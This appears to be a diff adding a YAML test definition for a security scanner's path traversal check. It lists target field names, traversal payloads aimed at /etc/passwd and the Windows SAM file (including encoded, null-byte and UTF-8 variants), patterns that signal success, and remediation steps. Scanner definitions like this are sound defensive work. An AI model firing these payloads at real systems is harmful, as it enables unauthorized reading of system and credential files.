@@ -1,0 +1,51 @@
+name: "Path Traversal / Directory Traversal"
+category: "file-access"
+severity: "high"
+
+description: >
+  Tests for unauthorized file system access via path manipulation,
+  including traversal sequences, encoding tricks, and legacy bypasses.
+
+target_fields:
+  - "file"
+  - "path"
+  - "document"
+  - "folder"
+  - "dir"
+  - "download"
+  - "read"
+  - "template"
+  - "include"
+  - "page"
+
+payloads:
+  # Basic traversal
+  - "../../../etc/passwd"
+  - "..\\..\\..\\windows\\system32\\config\\sam"
+  - "....//....//....//etc/passwd"
+
+  # URL encoded
+  - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  - "..%252f..%252f..%252fetc/passwd"
+
+  # Null byte injection (legacy)
+  - "../../../etc/passwd%00"
+  - "../../../etc/passwd%00.jpg"
+
+  # Double encoding / UTF-8 tricks
+  - "..%c0%af..%c0%af..%c0%afetc/passwd"
+
+success_indicators:
+  response_patterns:
+    - "root:x:"
+    - "[boot loader]"
+    - "<?php"
+  status_codes:
+    - 200
+
+remediation: |
+  1. Validate and sanitize all file path inputs
+  2. Use allowlists for permitted files and directories
+  3. Enforce canonical path resolution before access
+  4. Implement chroot jails or containerized file systems
+  5. Use indirect file references (IDs instead of raw paths)
